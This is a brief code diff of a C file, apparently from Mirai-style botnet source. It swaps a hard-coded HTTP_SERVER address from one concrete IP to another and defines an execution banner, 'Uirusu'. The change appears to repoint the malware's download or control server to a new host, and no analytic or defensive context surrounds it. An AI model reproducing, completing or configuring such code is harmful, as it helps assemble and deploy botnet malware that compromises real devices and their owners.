@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(173,232,146,173) //0,0,0,0
+#define HTTP_SERVER utils_inet_addr(99,79,193,92) //0,0,0,0
 
 #define EXEC_MSG            "Uirusu\n"
 #define EXEC_MSG_LEN        6
